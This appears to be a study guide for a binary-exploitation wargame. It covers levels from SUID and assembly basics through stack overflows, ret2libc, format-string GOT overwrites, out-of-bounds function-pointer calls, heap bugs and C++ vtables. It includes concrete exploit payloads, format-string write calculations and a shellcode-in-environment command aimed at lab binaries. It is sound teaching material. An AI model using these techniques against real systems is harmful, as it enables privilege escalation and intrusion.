Level 0 - Basic Binary Analysis
🎯 Concepts Covered
1. SUID Binaries
What is it?
SUID (Set User ID) is a special permission that allows a program to run with the privileges of the file owner, not the user running it.
Example:
bash-rwsr-xr-x 1 level1 users 7355 level0
# The 's' in 'rws' means SUID is set
# This binary runs as 'level1' user
Why it matters:

Allows privilege escalation
Key to getting next level's password
Security risk if exploitable

Learn More:

📖 Linux SUID Basics
📖 SUID Security Implications
🎥 YouTube: SUID Explained

2. Assembly Language Basics
Key Concepts:
nasmmov    eax, 5        ; Move 5 into EAX register
cmp    eax, 0x1a7    ; Compare EAX with 0x1a7
jne    0x8048f58     ; Jump if Not Equal
call   0x8049710     ; Call function at address
Registers (x86):

EAX: Accumulator (return values, calculations)
EBX: Base register
ECX: Counter
EDX: Data register
ESP: Stack Pointer (top of stack)
EBP: Base Pointer (bottom of current frame)
EIP: Instruction Pointer (next instruction)

Learn More:

📖 x86 Assembly Guide
📖 Assembly Tutorial
🎥 YouTube: x86 Assembly Crash Course
🛠️ Practice: pwnable.kr - fd level

3. Integer Comparison in Assembly
How it works:
nasm; Example from level0
call   atoi           ; Convert string to integer
cmp    eax, 0x1a7     ; Compare result with 423 (decimal)
jne    failure        ; If not equal, jump to failure
; Success code here
Common Comparison Instructions:

cmp a, b - Compare a with b
je / jne - Jump if Equal / Not Equal
jg / jl - Jump if Greater / Less
jge / jle - Jump if Greater/Equal or Less/Equal

Learn More:

📖 Comparison and Branching
📖 Jump Instructions Reference

4. GDB (GNU Debugger)
Essential Commands:
bashgdb ./level0                    # Start GDB
disas main                      # Disassemble main function
break *0x08048484              # Set breakpoint at address
run 423                        # Run with argument
info registers                 # Show all registers
x/20wx $esp                    # Examine stack memory
ni                             # Next instruction
si                             # Step into function
Learn More:

📖 GDB Tutorial
📖 GDB Cheat Sheet
🎥 YouTube: GDB Debugging Tutorial
🛠️ Interactive: GDB Online

5. Number Base Conversion
Hexadecimal to Decimal:
python0x1a7 = (1 × 16²) + (10 × 16¹) + (7 × 16⁰)
      = 256 + 160 + 7
      = 423
Quick conversions:
bash# Python
python -c "print(0x1a7)"        # Output: 423
python -c "print(hex(423))"     # Output: 0x1a7

# Calculator (bc)
echo "ibase=16; 1A7" | bc       # Output: 423
Learn More:

📖 Number Systems Guide
🎮 Practice: Hex Game


Level 1 - Buffer Overflow Basics
🎯 Concepts Covered
1. Stack Memory Layout
Visual Representation:
High Memory Addresses
+------------------+
|   Arguments      |  <- argv, argc
+------------------+
|   Return Addr    |  <- EIP will jump here (TARGET!)
+------------------+
|   Saved EBP      |  <- Previous stack frame
+------------------+
|   Local Vars     |  <- Your buffer is here
|   (buffer[76])   |
+------------------+
|   ...            |
+------------------+  <- ESP (Stack Pointer)
Low Memory Addresses

Stack grows DOWN (towards lower addresses)
Key Points:

Stack grows downward (high → low addresses)
Return address is stored on stack
Buffer overflow can overwrite return address
When function returns, jumps to return address

Learn More:

📖 Stack Memory Explained
📖 Call Stack Visualization
🎥 YouTube: Stack Memory Explained
🎮 Interactive: Stack Visualizer

2. Buffer Overflow Vulnerability
What is it?
When you write more data to a buffer than it can hold, overwriting adjacent memory.
Vulnerable Code:
cchar buffer[76];
gets(buffer);  // DANGEROUS! No bounds checking
Why gets() is dangerous:

Reads unlimited input
No size limit
Will keep writing past buffer end
Can overwrite return address

Safe Alternatives:
c// BAD
gets(buffer);

// GOOD
fgets(buffer, sizeof(buffer), stdin);
read(0, buffer, sizeof(buffer));
Exploitation:
Input: "AAAA..." (80 bytes) + "\x44\x84\x04\x08" (return address)
       [----76 bytes----][--4--][------4 bytes------]
        Fill buffer      EBP     Overwrite ret addr
Learn More:

📖 Smashing The Stack For Fun And Profit ⭐ MUST READ
📖 Buffer Overflow Tutorial
🎥 YouTube: Buffer Overflow Explained
🛠️ Practice: OverTheWire Narnia

3. Finding Offsets
Method 1: Pattern Creation (PEDA)
bashgdb ./level1
(gdb) pattern create 200
# Copy the pattern
(gdb) run
# Program crashes
(gdb) pattern offset $eip
# Shows exact offset: 76
Method 2: Manual Calculation
bash(gdb) disas main
   ...
   0x08048483 <+3>:  sub    esp,0x50    # 0x50 = 80 bytes allocated
   
# Stack layout:
# 80 bytes total - 4 bytes (EBP) = 76 bytes to return address
Method 3: Trial and Error
python# Try different offsets
for i in range(50, 100):
    payload = "A" * i + "BBBB"
    # Run and check if EIP = 0x42424242 (BBBB)
Learn More:

📖 Finding Buffer Offsets
🛠️ Tool: msf-pattern_create

4. Little-Endian Format
What is it?
Byte ordering where the least significant byte is stored first.
Example:
Address: 0x08048444

Big-Endian:    08 04 84 44
Little-Endian: 44 84 04 08  ← x86 uses this!

In Python: "\x44\x84\x04\x08"
Why it matters:
python# WRONG
payload = "A" * 76 + "\x08\x04\x84\x44"

# CORRECT
payload = "A" * 76 + "\x44\x84\x04\x08"
Quick Conversion:
pythonimport struct

# Address to little-endian
addr = 0x08048444
little_endian = struct.pack("<I", addr)
print(repr(little_endian))  # '\x44\x84\x04\x08'

# Little-endian to address
bytes_data = "\x44\x84\x04\x08"
address = struct.unpack("<I", bytes_data)[0]
print(hex(address))  # 0x8048444
Learn More:

📖 Endianness Explained
📖 Why Little-Endian?
🎥 YouTube: Endianness Tutorial

5. Control Flow Hijacking
Normal Flow:
main() → calls function → function returns → continues in main
Exploited Flow:
main() → calls function → buffer overflow → returns to run() → shell!
How it works:
nasm; End of vulnerable function
mov    esp, ebp
pop    ebp
ret               ; Pops return address and jumps to it
                 ; We control this address!
Learn More:

📖 Control Flow Hijacking
📖 Return Address Overwrite


Level 2 - ret2libc & Bypass Protections
🎯 Concepts Covered
1. Non-Executable Stack (NX/DEP)
What is it?
Security mechanism that marks stack memory as non-executable.
Check if enabled:
bashchecksec ./level2
# Output: NX enabled

readelf -l level2 | grep STACK
# GNU_STACK ... RW  (Read-Write, not Execute)
Impact:

Can't execute shellcode on stack
Need alternative exploitation method
ret2libc is the solution

Learn More:

📖 DEP/NX Explained
📖 Stack Protection Methods
🎥 YouTube: NX Bit Explained

2. ret2libc (Return-to-libc)
Concept:
Instead of executing shellcode, reuse existing code from libc library.
Strategy:
Overflow buffer → Overwrite return address → Jump to system() → 
Pass "/bin/sh" as argument → Get shell!
Stack Layout for ret2libc:
+------------------+
| "/bin/sh" addr   | ← Argument to system()
+------------------+
| Fake return addr | ← Where system() returns (we don't care)
+------------------+
| system() address | ← Return address (jump here first!)
+------------------+
| Saved EBP        |
+------------------+
| Buffer overflow  |
+------------------+
Why it works:
c// We're essentially creating this call:
system("/bin/sh");

// On stack:
// [system_addr][fake_ret][binsh_addr]
//     ↓
// Call system() with argument at binsh_addr
Learn More:

📖 ret2libc Explanation ⭐ EXCELLENT
📖 Return-to-libc Attack
🎥 YouTube: ret2libc Tutorial
🛠️ Practice: ROP Emporium - ret2win

3. Finding libc Functions
Method 1: GDB
bashgdb ./level2
(gdb) break main
(gdb) run
(gdb) print system
$1 = {<text variable>} 0xb7e6b060 <system>

(gdb) print __libc_system
$2 = {<text variable>} 0xb7e6b060 <__libc_system>
Method 2: Find "/bin/sh" string
bash(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.

(gdb) x/s 0xb7f8cc58
0xb7f8cc58:      "/bin/sh"
Method 3: Using ldd
bashldd ./level2
    linux-gate.so.1 =>  (0xb7fda000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e2c000)
Learn More:

📖 Finding libc Addresses
📖 Dynamic Linking Explained

4. Bypassing Address Checks
The Protection:
cvoid p(void) {
    unsigned int ret_addr;
    char buffer[76];
    
    gets(buffer);
    ret_addr = __builtin_return_address(0);
    
    // Check if return address is on stack (0xbXXXXXXX)
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", ret_addr);
        exit(1);  // Prevent stack execution
    }
}
Why ret2libc bypasses it:

system() is in libc, not on stack
Address like 0xb7e6b060 fails the check BUT
We're not returning there directly from overflow
We're using it as a function call target

Learn More:

📖 Bypassing Stack Protection

5. Function Calling Convention (x86)
cdecl Convention:
1. Arguments pushed right-to-left
2. Call instruction
3. Return value in EAX
4. Caller cleans up stack
Example:
csystem("/bin/sh");

// On stack:
push "/bin/sh" address
call system
In ret2libc:
Stack:
+------------------+
| "/bin/sh" addr   | ← First argument (offset +8 from ret addr)
+------------------+
| Fake return      | ← Where to return after system() (+4)
+------------------+
| system() addr    | ← EIP jumps here
+------------------+
Learn More:

📖 Calling Conventions
📖 cdecl Explained
🎥 YouTube: x86 Calling Convention


Level 3 - Format String Vulnerabilities
🎯 Concepts Covered
1. How printf() Works
Normal Usage:
cprintf("Hello %s, you are %d years old\n", name, age);
//     ^format string^              ^arguments from stack^
Under the Hood:
Stack:
+------------------+
| age (25)         | ← %d reads this
+------------------+
| name pointer     | ← %s reads this
+------------------+
| format string    |
+------------------+
Vulnerable Usage:
cchar buffer[512];
fgets(buffer, 512, stdin);
printf(buffer);  // DANGEROUS! User controls format string
Learn More:

📖 printf() internals
📖 Format String Basics

2. Format String Vulnerability
The Problem:
c// VULNERABLE
printf(user_input);

// SAFE
printf("%s", user_input);
Why it's dangerous:
bash# Normal
$ echo "Hello" | ./level3
Hello

# Exploitation
$ echo "%x %x %x" | ./level3
200 b7fd1ac0 b7ff37d0  # Leaks stack values!
What you can do:

Read memory using %x, %s, %p
Write memory using %n
Crash program with invalid formats

Learn More:

📖 Format String Exploitation ⭐ MUST READ
📖 Format String Attack
🎥 YouTube: Format String Vulnerability
🛠️ Practice: pwnable.kr - passcode

3. Format Specifiers
Common Specifiers:
c%d    // Decimal integer
%x    // Hexadecimal
%s    // String (reads pointer)
%p    // Pointer address
%n    // WRITE number of bytes printed so far to address!
%hn   // Write as short (2 bytes)
%hhn  // Write as byte (1 byte)
Reading Stack:
bash# Test input
echo "AAAA.%x.%x.%x.%x" | ./level3

# Output
AAAA.200.b7fd1ac0.b7ff37d0.41414141
#                            ^^^^^^^^
#                            Our "AAAA" (0x41 = 'A')
Direct Parameter Access:
bash# Instead of %x %x %x %x to reach 4th parameter:
echo "%4$x" | ./level3
41414141  # Directly reads 4th parameter
Learn More:

📖 Format Specifier Reference
📖 Format String Cheat Sheet

4. The %n Specifier (Writing Memory)
What %n does:
Writes the number of bytes printed SO FAR to the address pointed to by the argument.
Example:
cint count;
printf("Hello%n", &count);
// count now contains 5 (length of "Hello")
Exploitation:
python# Goal: Write 64 to address 0x0804988c

# Address of variable 'm'
addr = "\x8c\x98\x04\x08"

# We need to print 64 bytes total before %n
# Address itself is 4 bytes, so need 60 more
padding = "%60x"  # Prints 60 characters

# Direct parameter access (say 4th position)
write = "%4$n"

payload = addr + padding + write
How it works:
1. "\x8c\x98\x04\x08" - Address pushed to stack (4 bytes printed)
2. "%60x" - Prints 60 more characters (total: 64 bytes)
3. "%4$n" - Writes 64 to address at 4th parameter
Learn More:

📖 %n Exploitation
🎥 YouTube: Format String %n

5. Finding Stack Offset
Goal: Find where your input appears on the stack
Method:
bash# Put recognizable pattern at start
echo "AAAA.%x.%x.%x.%x.%x.%x" | ./level3

# Output example:
AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e
#                            ^^^^^^^^
#                            This is our "AAAA" (0x41414141)
#                            It's at position 4!
Testing:
bash# Verify with direct access
echo "AAAA%4$x" | ./level3
# Should output: AAAA41414141
Learn More:

📖 Finding Format String Offset


Level 4 - Advanced Format Strings
🎯 Concepts Covered
1. Writing Large Values
Challenge:
Need to write a large number (like 0x01025544) without printing millions of characters.
Solution: Split into Multiple Writes
python# Target: Write 0x01025544 to address 0x08049810

# Split into 2 shorts:
# Low:  0x5544 = 21828 decimal
# High: 0x0102 = 258 decimal

# Write to two adjacent addresses:
addr_low = "\x10\x98\x04\x08"   # 0x08049810
addr_high = "\x12\x98\x04\x08"  # 0x08049812

# But 258 < 21828, so we need to wrap around
# Use 0x10102 instead: 65538 decimal
# 65538 - 21828 = 43710

payload = addr_low + addr_high
payload += "%21820x"    # Print 21820 (21828 - 8 for addresses)
payload += "%4$hn"      # Write to low address
payload += "%43710x"    # Print additional 43710
payload += "%5$hn"      # Write to high address
Learn More:

📖 Writing Arbitrary Values

2. Precision Padding
Using Width Specifier:
cprintf("%10x", 5);     // "         5" (10 characters)
printf("%100x", 5);    // "   ...   5" (100 characters)
In Exploitation:
python# Need to print exactly N bytes before %n
target_value = 1234
already_printed = 8  # Two addresses

padding = target_value - already_printed
payload = addresses + "%%%dx" % padding + "%4$n"
Learn More:

📖 Format String Precision

3. Multiple Writes in One Payload
Strategy:
1. Place all addresses first
2. Calculate padding for each write
3. Use %hn for 2-byte writes
4. Reference correct parameter positions
Example:
python# Four addresses (16 bytes)
addrs = "\x10\x98\x04\x08"  # Position 4
addrs += "\x12\x98\x04\x08"  # Position 5
addrs += "\x14\x98\x04\x08"  # Position 6
addrs += "\x16\x98\x04\x08"  # Position 7

# Write different values to each
payload = addrs
payload += "%50x%4$hhn"   # Write 50+16=66 to first
payload += "%100x%5$hhn"  # Write 66+100=166 to second
# etc...
Learn More:

📖 Advanced Format String


Level 5 - GOT Overwrite
🎯 Concepts Covered
1. GOT (Global Offset Table)
What is GOT?
Table that stores addresses of dynamically linked functions.
Why it exists:

Shared libraries (libc) can be loaded at different addresses
GOT provides a level of indirection
Programs look up function addresses in GOT at runtime

Visual:
Program calls printf()
    ↓
Jumps to PLT (Procedure Linkage Table)
    ↓
PLT looks up address in GOT
    ↓
Jumps to actual printf() in libc
Learn More:

📖 PLT and GOT Explained ⭐ EXCELLENT
📖 Understanding GOT/PLT
🎥 YouTube: GOT/PLT Explained

2. Finding GOT Entries
Method 1: objdump
bashobjdump -R ./level5

OFFSET   TYPE              VALUE
08049804 R_386_JUMP_SLOT   printf
0804980c R_386_JUMP_SLOT   fgets
08049810 R_386_JUMP_SLOT   system
0804981c R_386_JUMP_SLOT   exit    ← Target this!
Method 2: readelf
bashreadelf -r ./level5

Relocation section '.rel.plt':
 Offset     Info    Type            Sym.Value  Sym. Name
0804981c  00000407 R_386_JUMP_SLOT   00000000   exit
Method 3: GDB
bashgdb ./level5
(gdb) disas exit
# Shows PLT stub

(gdb) x/wx 0x0804981c
0x804981c <exit@got.plt>:    0xb7e5ebe0
Learn More:

📖 Finding GOT Entries

3. GOT Overwrite Attack
Strategy:

Find GOT entry of a function that will be called
Overwrite it with address of target function
When program calls original function, it jumps to our target

Example:
Program flow:
main() → ... → exit() → program ends

After GOT overwrite:
main() → ... → exit@GOT → actually jumps to o() → shell!
Why it works:

GOT is writable (by design)
Format string gives us write primitive
Can overwrite any GOT entry

Learn More:

📖 GOT Overwrite Technique
🛠️ Practice: pwnable.tw - Formatted String

4. Calculating GOT Overwrite
Goal: Write address 0x080484a4 to GOT entry at 0x0804981c
Split into shorts:
pythontarget_addr = 0x080484a4
got_entry = 0x0804981c

# Split target into 2 shorts (16-bit values)
low_short = target_addr & 0xFFFF          # 0x84a4 = 33956
high_short = (target_addr >> 16) & 0xFFFF # 0x0804 = 2052

# Write to two addresses:
got_low = got_entry      # 0x0804981c (writes low 2 bytes)
got_high = got_entry + 2 # 0x0804981e (writes high 2 bytes)

# Problem: 2052 < 33956 (can't go backwards!)
# Solution: Write 0x10804 instead (65536 + 2052 = 67588)

# Payload:
payload = struct.pack('<I', got_low)   # 4 bytes
payload += struct.pack('<I', got_high) # 4 bytes (8 total)

# Write 33956 (including 8 bytes already printed)
payload += "%33948x"  # 33956 - 8 = 33948
payload += "%4$hn"    # Write to position 4 (got_low)

# Write 67588 (difference: 67588 - 33956 = 33632)
payload += "%33632x"
payload += "%5$hn"    # Write to position 5 (got_high)
Step-by-step breakdown:

Print 8 bytes (two addresses)
Print 33948 more = 33956 total → write to low bytes
Print 33632 more = 67588 total → write to high bytes
High bytes: 67588 & 0xFFFF = 0x10804 → 0x0804 in memory

Learn More:

📖 Format String Arithmetic

5. Lazy Binding
Concept:
Functions aren't resolved until first called.
First call:
1. Call printf@PLT
2. PLT checks GOT entry
3. GOT contains resolver address
4. Resolver finds real printf() in libc
5. GOT entry updated with real address
6. Jump to printf()
Subsequent calls:
1. Call printf@PLT
2. PLT checks GOT entry
3. GOT has real address → jump directly
Exploitation Impact:

GOT entries are writeable
Overwrite them to hijack function calls
Works for any dynamically linked function

Learn More:

📖 Dynamic Linking Deep Dive
🎥 YouTube: Dynamic Linking Explained


Level 6 - Function Pointers
🎯 Concepts Covered
1. Function Pointers in C
What are they?
Variables that store addresses of functions.
Example:
cvoid hello() {
    printf("Hello!\n");
}

void goodbye() {
    printf("Goodbye!\n");
}

int main() {
    void (*func_ptr)();  // Declare function pointer
    
    func_ptr = hello;    // Point to hello
    func_ptr();          // Calls hello()
    
    func_ptr = goodbye;  // Point to goodbye
    func_ptr();          // Calls goodbye()
}
In Memory:
+------------------+
| func_ptr         | Contains: 0x08048444 (address of hello)
+------------------+

When you call func_ptr():
- Jumps to address stored in func_ptr
- Executes function there
Learn More:

📖 Function Pointers Tutorial
📖 Function Pointers Explained
🎥 YouTube: C Function Pointers

2. Array of Function Pointers
Common Pattern:
cvoid func0() { /* ... */ }
void func1() { /* ... */ }
void func2() { /* ... */ }

void (*funcs[3])() = {func0, func1, func2};

// Call based on index
int index = get_user_input();
funcs[index]();  // DANGEROUS if index not validated!
Exploitation:
cvoid (*funcs[5])();
int index;

scanf("%d", &index);  // User controls index!
funcs[index]();       // Can call ANY address!

// If we know address of hidden function:
// Input: (addr - array_base) / sizeof(pointer)
// We jump to our target!
Learn More:

📖 Array of Function Pointers

3. Memory Layout of Arrays
Array in Memory:
cint array[5] = {1, 2, 3, 4, 5};

Memory:
+--------+--------+--------+--------+--------+
| array[0] | array[1] | array[2] | array[3] | array[4] |
| 1      | 2      | 3      | 4      | 5      |
+--------+--------+--------+--------+--------+
0x1000   0x1004   0x1008   0x100C   0x1010

array[0] is at array + 0
array[1] is at array + 4  (4 bytes per int)
array[n] is at array + (n * 4)
For Function Pointers:
cvoid (*funcs[5])();

Memory (32-bit):
+--------+--------+--------+--------+--------+
| funcs[0] | funcs[1] | funcs[2] | funcs[3] | funcs[4] |
| 0x08... | 0x08... | 0x08... | 0x08... | 0x08... |
+--------+--------+--------+--------+--------+
0x2000   0x2004   0x2008   0x200C   0x2010
Exploitation:
python# If target function is at 0x08048530
# And array starts at 0x08049900
# And we can control index:

target = 0x08048530
array_base = 0x08049900

# Calculate index that reaches target
index = (target - array_base) / 4
Learn More:

📖 C Arrays Memory Layout
📖 Pointer Arithmetic

4. Out-of-Bounds Array Access
The Vulnerability:
cvoid (*funcs[4])();

// No bounds checking!
int index = atoi(user_input);
funcs[index]();  // What if index = 10? or -5?
What happens:
Normal: funcs[0] to funcs[3] are valid
Out-of-bounds: funcs[10] reads memory past array end
Negative: funcs[-5] reads memory before array start
Memory View:
Lower addresses
+------------------+
| other_variable   | funcs[-2]
+------------------+
| another_variable | funcs[-1]
+------------------+
| funcs[0]         | ← Array starts here
+------------------+
| funcs[1]         |
+------------------+
| funcs[2]         |
+------------------+
| funcs[3]         |
+------------------+
| some_data        | funcs[4] (out of bounds!)
+------------------+
| target_function  | funcs[N] (if we calculate N correctly!)
+------------------+
Higher addresses
Exploitation Strategy:

Find address of target function
Find address of function pointer array
Calculate index: (target - array) / sizeof(ptr)
Provide that index as input
Program calls target function!

Learn More:

📖 Array Bounds Checking
📖 Memory Corruption via Arrays
🎥 YouTube: Buffer Overflow Arrays

5. Arbitrary Function Call
Concept:
By controlling which function pointer gets called, you can execute any code.
Example Scenario:
cvoid n() {
    // Functions in array
}

void m() {
    // Secret function not in array!
    system("/bin/sh");
}

void (*funcs[5])();
funcs[0] = n;
// ... other functions

// User input
int idx = atoi(argv[1]);
funcs[idx]();  // Can we call m() even though it's not in array?
Solution:
python# Find addresses
m_addr = 0x08048454      # Address of m()
funcs_addr = 0x08049988  # Address of funcs array

# Calculate magic index
# funcs[idx] means: *(funcs + idx * 4)
# We want: funcs + idx * 4 = m_addr
# So: idx = (m_addr - funcs_addr) / 4

idx = (0x08048454 - 0x08049988) / 4
# This will be negative! That's OK!
# funcs[idx] will read memory BEFORE the array
# And that memory contains the address we want!
Learn More:

📖 Arbitrary Code Execution
🛠️ Practice: pwnable.kr - bof


Level 7 - Advanced GOT & Memory Corruption
🎯 Concepts Covered
1. Multiple GOT Overwrites
Scenario:
Sometimes you need to overwrite multiple GOT entries for complex exploits.
Strategy:
python# Overwrite two functions
got_puts = 0x08049804
got_exit = 0x0804981c

target1 = 0x08048530  # Address to write to puts
target2 = 0x08048590  # Address to write to exit

# Use format string to write both
payload = struct.pack('<I', got_puts)
payload += struct.pack('<I', got_puts + 2)
payload += struct.pack('<I', got_exit)
payload += struct.pack('<I', got_exit + 2)

# Calculate padding for each write
# ... (similar to Level 5)
Learn More:

📖 Advanced GOT Exploitation

2. Format String with Limited Input
Challenge:
What if you can only send short input?
Solution: Multiple Writes
c// Program reads input multiple times
while (1) {
    fgets(buffer, 100, stdin);
    printf(buffer);  // Vulnerable each time!
}

// Exploit:
// Write 1: First 2 bytes
// Write 2: Next 2 bytes
// Write 3: Trigger exploit
Learn More:

📖 Format String Limitations

3. strcpy() Exploitation
Vulnerability:
cchar dest[10];
strcpy(dest, user_input);  // No size limit!
How strcpy works:

Copies until null byte (\x00)
No bounds checking
Can overflow destination

Exploitation:
python# Overflow buffer with strcpy
payload = "A" * offset
payload += return_address
payload += "rest of exploit"
Safe Alternatives:
c// BAD
strcpy(dest, src);

// GOOD
strncpy(dest, src, sizeof(dest));
dest[sizeof(dest)-1] = '\0';  // Ensure null termination

// BETTER
strlcpy(dest, src, sizeof(dest));  // BSD systems

// BEST
snprintf(dest, sizeof(dest), "%s", src);
Learn More:

📖 strcpy Vulnerabilities
📖 Secure String Functions
🎥 YouTube: strcpy Security Issues

4. Environment Variables Exploitation
Concept:
Store shellcode in environment variable, then jump to it.
Why it works:

Environment variables stored in predictable location
On stack at high addresses
Executable (if NX disabled)

Finding Environment Address:
c// getenv.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    printf("%s: %p\n", argv[1], getenv(argv[1]));
    return 0;
}
Usage:
bashexport SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0..."')
./getenv SHELLCODE
# Output: SHELLCODE: 0xbffff890

# Now use this address in exploit
./level7 $(python -c 'print "A"*offset + "\x90\xf8\xff\xbf"')
Learn More:

📖 Environment Variable Exploitation
📖 Shellcode in Environment
🎥 YouTube: Environment Shellcode

5. ASLR Bypass Techniques
What is ASLR?
Address Space Layout Randomization - randomizes memory addresses.
Check if enabled:
bashcat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = partial (stack, heap, libraries)
# 2 = full (includes PIE executables)
Bypass Methods:
1. Information Leak:
c// Leak stack address
printf("Stack: %p\n", &local_var);
// Use leaked address in exploit
2. Brute Force:
bash# ASLR only randomizes certain bits
# Keep trying until we hit correct address
while true; do
    ./exploit
done
3. ret2plt/ret2got:
python# Jump to PLT entries (not randomized)
# They redirect to actual functions
system_plt = 0x08048430  # Fixed address
Learn More:

📖 ASLR Explained ⭐
📖 Bypassing ASLR
📖 ASLR Bypass Techniques
🎥 YouTube: ASLR Bypass


Level 8 - Heap Exploitation
🎯 Concepts Covered
1. Heap vs Stack
Stack Memory:
- Automatic allocation/deallocation
- LIFO (Last In, First Out)
- Fast allocation
- Limited size
- Local variables stored here

Example:
void func() {
    int x = 5;  // On stack
}  // x automatically freed
Heap Memory:
- Manual allocation/deallocation
- Dynamic size
- Slower allocation
- Large size available
- malloc()/free() used

Example:
void func() {
    int *x = malloc(sizeof(int));  // On heap
    *x = 5;
    free(x);  // Must manually free!
}
Memory Layout:
High Addresses
+------------------+
| Stack            | ← Grows DOWN
| (local vars)     |
+------------------+
|        ↓         |
|                  |
|        ↑         |
+------------------+
| Heap             | ← Grows UP
| (malloc'ed data) |
+------------------+
| BSS (uninitialized) |
+------------------+
| Data (initialized) |
+------------------+
| Text (code)      |
+------------------+
Low Addresses
Learn More:

📖 Heap vs Stack ⭐ EXCELLENT
📖 Memory Layout of C Programs
🎥 YouTube: Stack vs Heap Memory

2. malloc() and free()
How malloc() works:
cvoid *malloc(size_t size);
// Returns pointer to allocated memory
// Memory is NOT initialized (contains garbage)

Example:
char *str = malloc(100);  // Allocate 100 bytes
if (str == NULL) {
    // Allocation failed
}
strcpy(str, "Hello");
free(str);  // MUST free when done!
Heap Chunk Structure:
+------------------+
| Size + Flags     | ← Metadata (8 bytes on 32-bit)
+------------------+
| User Data        | ← Pointer returned by malloc points here
| (requested size) |
+------------------+
| Size + Flags     | ← Next chunk metadata
+------------------+
Flags in Size field:

P (bit 0): Previous chunk in use
M (bit 1): Chunk from mmap
N (bit 2): Chunk from non-main arena

free() internals:
cfree(ptr);
// 1. Marks chunk as free
// 2. Coalesces with adjacent free chunks
// 3. Adds to free list (bins)
// 4. Does NOT clear memory!
Learn More:

📖 Understanding glibc malloc ⭐ MUST READ
📖 malloc Internals
📖 Heap Exploitation Series
🎥 YouTube: How malloc Works

3. Heap Overflow
Vulnerability:
cchar *buffer = malloc(4);
strcpy(buffer, user_input);  // Input longer than 4 bytes!
What happens:
Before overflow:
+------------------+
| Chunk 1 metadata |
+------------------+
| "AAAA" (4 bytes) | ← buffer points here
+------------------+
| Chunk 2 metadata |
+------------------+
| Chunk 2 data     |
+------------------+

After overflow with "AAAABBBBCCCC":
+------------------+
| Chunk 1 metadata |
+------------------+
| "AAAABBBBCCCC"   | ← Overflows into next chunk!
+------------------+ ← Chunk 2 metadata CORRUPTED!
| CORRUPTED        |
+------------------+
| Chunk 2 data     |
+------------------+
Exploitation:

Overwrite next chunk's metadata
Overwrite next chunk's data
Corruption of heap structures
Potential code execution

Learn More:

📖 Heap Overflow Tutorial
📖 Heap Overflow Exploitation

4. Use-After-Free
The Vulnerability:
cchar *ptr = malloc(100);
strcpy(ptr, "Hello");
free(ptr);           // Memory freed

// ... later ...
printf("%s", ptr);   // USE AFTER FREE! Dangerous!
ptr[0] = 'X';        // Writing to freed memory!
Why it's dangerous:
1. free(ptr) - Memory marked as free
2. malloc() called elsewhere - Might reuse ptr's memory!
3. Original code still uses ptr - But memory contains new data!
4. Confusion, corruption, exploitation!
Exploitation Example:
cstruct User {
    void (*print)();
    char name[32];
};

struct User *user = malloc(sizeof(struct User));
user->print = safe_print;
free(user);  // Freed!

// Attacker allocates memory that reuses same location
char *evil = malloc(sizeof(struct User));
strcpy(evil, shellcode_with_fake_function_ptr);

// Original code:
user->print();  // Calls attacker's shellcode!
Learn More:

📖 Use-After-Free Explained ⭐
📖 UAF Exploitation
🎥 YouTube: Use After Free
🛠️ Practice: how2heap - UAF examples

5. Out-of-Bounds Heap Access
The Bug:
cchar *auth = malloc(4);      // Only 4 bytes!
char *service = malloc(32);  // 32 bytes

// Later in code:
if (auth[32] != 0) {         // Reading 32 bytes past auth!
    system("/bin/sh");
}
Heap Layout:
+------------------+
| auth metadata    |
+------------------+
| auth[0-3]        | ← auth pointer (4 bytes)
+------------------+
| metadata         |
+------------------+
| service[0-31]    | ← auth[32] is HERE!
+------------------+
Exploitation:
1. Allocate auth (4 bytes)
2. Allocate service (32+ bytes)
3. Service data is at auth[32]!
4. Check auth[32] succeeds if service has data!
Real Example (Level 8):
cchar *auth = NULL;
char *service = NULL;

if (cmd == "auth") {
    auth = malloc(4);
}

if (cmd == "service") {
    service = strdup(input);  // Allocates memory!
}

if (cmd == "login") {
    if (auth[32] != 0) {  // Checks beyond auth!
        system("/bin/sh");
    }
}
Learn More:

📖 Out-of-Bounds Memory Access
📖 Heap Feng Shui

6. Heap Exploitation Tools
Essential Tools:
1. ltrace - Library call tracer
bashltrace ./level8
# Shows all malloc, free, strcpy calls
# Output:
malloc(4) = 0x804a008
malloc(32) = 0x804a018
2. strace - System call tracer
bashstrace ./level8
# Shows system calls
3. GDB with heap commands
bashgdb ./level8
(gdb) break main
(gdb) run
(gdb) heap chunks  # With gef/pwndbg
4. how2heap - Heap exploitation techniques
bashgit clone https://github.com/shellphish/how2heap
cd how2heap
# Study the examples!
Learn More:

📖 Heap Exploitation Tools
🛠️ GEF (GDB Enhanced Features)
🛠️ pwndbg


Level 9 - C++ vtable Hijacking
🎯 Concepts Covered
1. C++ Objects in Memory
Simple Class:
cppclass Animal {
    int age;
    char name[20];
};

Memory:
+------------------+
| age (4 bytes)    |
+------------------+
| name (20 bytes)  |
+------------------+
Total: 24 bytes
With Virtual Functions:
cppclass Animal {
    virtual void speak();  // Virtual function!
    int age;
    char name[20];
};

Memory:
+------------------+
| vptr (4 bytes)   | ← Points to vtable!
+------------------+
| age (4 bytes)    |
+------------------+
| name (20 bytes)  |
+------------------+
Total: 28 bytes
Key Point:
Virtual functions add a vtable pointer (vptr) at the START of the object!
Learn More:

📖 C++ Object Layout ⭐ EXCELLENT
📖 Virtual Functions Explained
🎥 YouTube: C++ Virtual Functions

2. Virtual Tables (vtables)
What is a vtable?
Array of function pointers for virtual functions.
Example:
cppclass Base {
public:
    virtual void func1() { }
    virtual void func2() { }
    int data;
};

Memory Layout:
Object:
+------------------+
| vptr             | → Points to vtable
+------------------+
| data             |
+------------------+

vtable:
+------------------+
| ptr to func1()   | ← vtable[0]
+------------------+
| ptr to func2()   | ← vtable[1]
+------------------+
How Virtual Calls Work:
cppBase *obj = new Base();
obj->func1();

Assembly:
1. Load vptr from object
2. Load function pointer from vtable[0]
3. Call that function
In Assembly:
nasmmov eax, [object]      ; Get object address
mov eax, [eax]         ; Get vptr (first member)
mov eax, [eax]         ; Get vtable[0]
call eax               ; Call function!
Learn More:

📖 How Virtual Functions Work ⭐ MUST READ
📖 vtable Deep Dive
🎥 YouTube: vtable Internals
